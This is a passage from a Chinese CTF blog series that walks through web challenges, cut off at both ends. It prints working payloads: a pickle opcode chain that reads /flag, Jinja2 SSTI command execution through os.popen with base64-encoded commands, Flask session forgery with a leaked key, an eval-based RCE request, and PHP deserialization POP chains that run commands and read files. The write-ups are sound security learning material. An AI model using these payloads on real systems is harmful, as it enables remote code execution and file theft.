class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">cbuiltins<span class="hljs-symbol">\n</span>getattr<span class="hljs-symbol">\n</span>p0<span class="hljs-symbol">\n</span>：<br><br>c 表示导入模块，这里引用的是 Python 的内置模块 builtins。<br>getattr 用于获取指定对象的属性。<br>cbuiltins<span class="hljs-symbol">\n</span>open<span class="hljs-symbol">\n</span>p1<span class="hljs-symbol">\n</span>：<br><br>open 是 Python 的内置函数，用于打开文件。<br>0g1<span class="hljs-symbol">\n</span>(S&#x27;/flag&#x27;<span class="hljs-symbol">\n</span>tRp2<span class="hljs-symbol">\n</span>：<br><br>g1 引用之前序列化的 open 函数。<br>&#x27;/flag&#x27; 是文件路径，表示尝试打开 /flag 文件。<br>tR 调用 open 方法，返回一个文件对象（保存到 p2）。<br>0g0<span class="hljs-symbol">\n</span>(g2<span class="hljs-symbol">\n</span>S&#x27;read&#x27;<span class="hljs-symbol">\n</span>tRp3<span class="hljs-symbol">\n</span>：<br><br>使用 getattr 获取文件对象（g2 是 /flag 文件）的 read 方法。<br>tR 调用 read 方法，保存读取的内容到 p3。<br>0g1<span class="hljs-symbol">\n</span>(S&#x27;./app.py&#x27;<span class="hljs-symbol">\n</span>S&#x27;w&#x27;<span class="hljs-symbol">\n</span>tRp4<span class="hljs-symbol">\n</span>：<br><br>再次调用 open 函数，这次打开的是 ./app.py 文件，以写入模式 (w) 打开，返回文件对象（保存到 p4）。<br>0g0<span class="hljs-symbol">\n</span>(g4<span class="hljs-symbol">\n</span>S&#x27;write&#x27;<span class="hljs-symbol">\n</span>tRp5<span class="hljs-symbol">\n</span>：<br><br>使用 getattr 获取目标文件对象（p4）的 write 方法。<br>tR 返回 write 方法对象，保存到 p5。<br>0g5<span class="hljs-symbol">\n</span>(g6<span class="hljs-symbol">\n</span>tR.：<br><br>调用 write 方法，将之前读取的 /flag 文件内容写入 ./app.py 文件。<br>功能概述<br>反序列化此数据后，程序将执行以下操作：<br><br>打开 /flag 文件并读取其内容。<br>打开或创建 ./app.py 文件，以写入模式准备写入。<br>将 /flag 文件的内容写入到 ./app.py 文件中。<br></code></pre></td></tr></table></figure><p>自己对于pickle的反序列化和opcode的编写还不是很熟</p><p>还得练</p>]]></content>
    
    
    <categories>
      
      <category>每日一web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>opcode</tag>
      
      <tag>pickle</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2025.1.22</title>
    <link href="/tuyi/2025/01/22/%E6%AF%8F%E6%97%A5%E4%B8%80web-2025-1-22/"/>
    <url>/tuyi/2025/01/22/%E6%AF%8F%E6%97%A5%E4%B8%80web-2025-1-22/</url>
    
    <content type="html"><![CDATA[<h1 id="2023愚人杯easy-ssti"><a href="#2023愚人杯easy-ssti" class="headerlink" title="2023愚人杯easy-ssti"></a>2023愚人杯easy-ssti</h1><p>进入F12打开控制台提示下载app.zip</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> render_template_string,render_template<br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/hello/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hello</span>(<span class="hljs-params">name=<span class="hljs-literal">None</span></span>):<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;hello.html&#x27;</span>,name=name)<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/hello/&lt;name&gt;&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hellodear</span>(<span class="hljs-params">name</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;ge&quot;</span> <span class="hljs-keyword">in</span> name:<br>        <span class="hljs-keyword">return</span> render_template_string(<span class="hljs-string">&#x27;hello %s&#x27;</span> % name)<br>    <span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;f&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> name:<br>        <span class="hljs-keyword">return</span> render_template_string(<span class="hljs-string">&#x27;hello %s&#x27;</span> % name)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Nonononon&#x27;</span><br></code></pre></td></tr></table></figure><p>hello目录下有ssti</p><p>payload要有ge或者不能有f</p><p>尝试打</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;lipsum.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;ls /&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure><p>但是 &#x2F; 被当作路由报错，尝试绕过，使用base64编码<strong>反引号</strong>执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">`<span class="hljs-built_in">echo</span> bHMgLw== | <span class="hljs-built_in">base64</span> -d`<br></code></pre></td></tr></table></figure><p>得到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;lipsum.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;`echo bHMgLw== | base64 -d`&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure><p>最后使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;lipsum.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;`echo Y2F0IC9mbGFn | base64 -d`&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure><p>拿到flag</p><h1 id="2023愚人杯easy-flask"><a href="#2023愚人杯easy-flask" class="headerlink" title="2023愚人杯easy-flask"></a>2023愚人杯easy-flask</h1><p>进入看见登录框尝试sql，xss，ssti没结果</p><p>发现admin账号提示密码错误，注册账号进去看看</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250122150714144.png" alt="1"></p><p>提示我们是user，再learn看见密码是S3cr3tK3y</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250122150747281.png" alt="image-20250122150747281"></p><p>爆破session,拿到</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs clean">&#123;<span class="hljs-string">&#x27;loggedin&#x27;</span>: <span class="hljs-literal">True</span>, <span class="hljs-string">&#x27;role&#x27;</span>: <span class="hljs-string">&#x27;user&#x27;</span>, <span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>&#125;<br>-&gt; &#123;<span class="hljs-string">&#x27;loggedin&#x27;</span>: <span class="hljs-literal">True</span>, <span class="hljs-string">&#x27;role&#x27;</span>: <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>&#125;<br></code></pre></td></tr></table></figure><p>修改为admin用密钥加密,替换元素session</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">eyJsb2dnZWRpbiI6dHJ1ZSwicm9sZSI6ImFkbWluIiwidXNlcm5hbWUiOiIxIn0<span class="hljs-selector-class">.Z5CcCA</span>.IZ_i9nESqDbObpSXrK72b8-VfZ8<br></code></pre></td></tr></table></figure><p>伪造成功看见一个下载</p><p>​<img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250122152102290.png" alt="image-20250122152102290"></p><p>但是下载是一些没用的faskflag</p><p>抓包发现存在任意文件下载，下载源码看看&#x2F;app&#x2F;app.py绝对路径</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250122152504059.png" alt="image-20250122152504059"></p><p>发现hello目录存在rce</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/hello?<span class="hljs-built_in">eval</span>=__import__(<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;cat /flag_is_h3re &#x27;</span>).<span class="hljs-built_in">read</span>()<br></code></pre></td></tr></table></figure><p>导入os库拿到flag</p><h1 id="2023愚人杯easy-php"><a href="#2023愚人杯easy-php" class="headerlink" title="2023愚人杯easy-php"></a>2023愚人杯easy-php</h1><p>pop链，链子很简单，但是不能用O，a开头也就是不能用数组绕过</p><p>查了下资料，要用实现了<code>Serializable</code> 接口的原生类来构造</p><p>查找实现了serializable接口的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$classes</span> = <span class="hljs-title function_ invoke__">get_declared_classes</span>();<span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$classes</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$class</span>) &#123;<br><br>    <span class="hljs-variable">$methods</span> = <span class="hljs-title function_ invoke__">get_class_methods</span>(<span class="hljs-variable">$class</span>);<br><br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$methods</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$method</span>) &#123;<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$method</span>, <span class="hljs-keyword">array</span>(<br><br>            <span class="hljs-string">&#x27;unserialize&#x27;</span>,<br><br>        ))) &#123;<br><br>            <span class="hljs-keyword">print</span> <span class="hljs-variable">$class</span> . <span class="hljs-string">&#x27;::&#x27;</span> . <span class="hljs-variable">$method</span> . <span class="hljs-string">&quot;\n&quot;</span>;<br><br>        &#125;<br><br>    &#125;&#125;<br></code></pre></td></tr></table></figure><p>虽然在低版本的时候可以在Oa后面加+绕过但是这里不行，版本应该在7.4+</p><p>所有payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshow</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ctfshow</span>;<br><br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> ctfshow;<br><span class="hljs-variable">$a</span>-&gt;ctfshow=<span class="hljs-string">&quot;ls /&quot;</span>;<br><span class="hljs-variable">$arr</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;evil&quot;</span>=&gt;<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$oa</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayObject</span>(<span class="hljs-variable">$arr</span>);<br><span class="hljs-variable">$res</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$oa</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$res</span>;<br><span class="hljs-meta">?&gt;</span>;<br></code></pre></td></tr></table></figure><blockquote><p>注意：不要再phpstorm运行代码，不然会以O开头在本地原始环境运行</p></blockquote><p>最终payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">C:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;ArrayObject&quot;</span>:<span class="hljs-number">78</span>:&#123;x:i:<span class="hljs-number">0</span>;a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;evil&quot;</span>;O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;ctfshow&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;ctfshow&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;cat /f*&quot;</span>;&#125;&#125;;m:a:<span class="hljs-number">0</span>:&#123;&#125;&#125;<br></code></pre></td></tr></table></figure><h2 id="解释为什么不会触发-wakeup"><a href="#解释为什么不会触发-wakeup" class="headerlink" title="解释为什么不会触发__wakeup()"></a>解释为什么不会触发__wakeup()</h2><p>O标识符代表对象类型，而C标识符代表类名类型。如果将C替换为O，则在反序列化时会将其解释为一个新的类名字符串，从而创建一个新的类而不是对象。因为这个新的类没有被序列化过，所以它没有任何属性或方法。这样一来，在反序列化时，__wakeup魔术方法就不会触发，简单来说就是wakeup只对对象有效</p><h1 id="2023愚人杯被遗忘的反序列化"><a href="#2023愚人杯被遗忘的反序列化" class="headerlink" title="2023愚人杯被遗忘的反序列化"></a>2023愚人杯被遗忘的反序列化</h1><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment"># 当前目录中有一个txt文件哦</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;check.php&quot;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EeE</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$text</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eeee</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;text == <span class="hljs-string">&quot;aaaa&quot;</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">lcfirst</span>(<span class="hljs-variable">$this</span>-&gt;text);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$kk</span></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$kk</span>,eeeeeeeeeeeee&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__clone</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> cycycycy;<br>        <span class="hljs-variable">$a</span> -&gt; <span class="hljs-title function_ invoke__">aaa</span>();<br>    &#125;<br>    <br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cycycycy</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$b</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">aaa</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$get</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;get&#x27;</span>];<br>        <span class="hljs-variable">$get</span> = <span class="hljs-title function_ invoke__">cipher</span>(<span class="hljs-variable">$get</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$get</span> === <span class="hljs-string">&quot;p8vfuv8g8v8py&quot;</span>)&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;eval&quot;</span>]);<br>        &#125;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$a_a</span> = <span class="hljs-variable language_">$this</span> -&gt; a;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\$a_a\$&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">gBoBg</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$coos</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$eeee</span>=<span class="hljs-string">&quot;-_-&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;name))&#123;<br>            <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">coos</span>(<span class="hljs-variable">$this</span>-&gt;file);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span> -&gt; file))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;coos-&gt;name;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$aa</span> = <span class="hljs-variable language_">$this</span>-&gt;coos;<br>            <span class="hljs-variable">$bb</span> = <span class="hljs-variable language_">$this</span>-&gt;file;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$aa</span>();<br>        &#125;<br>    &#125;<br>&#125;   <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w_wuw_w</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$aaa</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/php|63|\*|\?/i&quot;</span>,<span class="hljs-variable">$this</span> -&gt; key))&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;key = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span> -&gt; file);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;不行哦&quot;</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;aaa;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span> -&gt; aaa = <span class="hljs-keyword">clone</span> <span class="hljs-keyword">new</span> EeE;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$_ip</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;HTTP_AAAAAA&quot;</span>];<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_ip</span>);<br></code></pre></td></tr></table></figure><p>首先是通过header头传参的 比较新奇</p><p>好多函数没定义肯定先要读.txt文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">gBoBg</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$coos</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$eeee</span>=<span class="hljs-string">&quot;-_-&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;name))&#123;<br>            <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">coos</span>(<span class="hljs-variable">$this</span>-&gt;file);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span> -&gt; file))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;coos-&gt;name;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$aa</span> = <span class="hljs-variable language_">$this</span>-&gt;coos;<br>            <span class="hljs-variable">$bb</span> = <span class="hljs-variable language_">$this</span>-&gt;file;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$aa</span>();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个类中coos和file都可控，那么就可以利用php原生类来读取文件</p><h2 id="GlobIterator"><a href="#GlobIterator" class="headerlink" title="GlobIterator"></a><strong>GlobIterator</strong></h2><p>GlobIterator 类也可以遍历一个文件目录，但与上面略不同的是其行为类似于 <a href="https://so.csdn.net/so/search?q=glob&spm=1001.2101.3001.7020">glob</a>()，可以通过模式匹配来寻找文件路径。</p><p>它的特点就是，只需要知道部分名称就可以进行遍历</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EeE</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$text</span> = <span class="hljs-string">&#x27;a&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eeee</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">gBoBg</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;fuck&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;*txt&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$coos</span> = <span class="hljs-string">&#x27;GlobIterator&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$e</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">EeE</span>();<br><span class="hljs-variable">$e</span> -&gt;text = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">gBoBg</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$e</span>);<br></code></pre></td></tr></table></figure><p>拿到文件名加<code>h1nt.txt</code></p><h2 id="SplFileObject"><a href="#SplFileObject" class="headerlink" title="SplFileObject"></a>SplFileObject</h2><p>拿到文件名那我们直接使用SplFileObject原生类直接读</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EeE</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$text</span> = <span class="hljs-string">&#x27;a&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eeee</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">gBoBg</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;fuck&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;h1nt.txt&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$coos</span> = <span class="hljs-string">&#x27;SplFileObject&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$e</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">EeE</span>();<br><span class="hljs-variable">$e</span> -&gt;text = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">gBoBg</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span 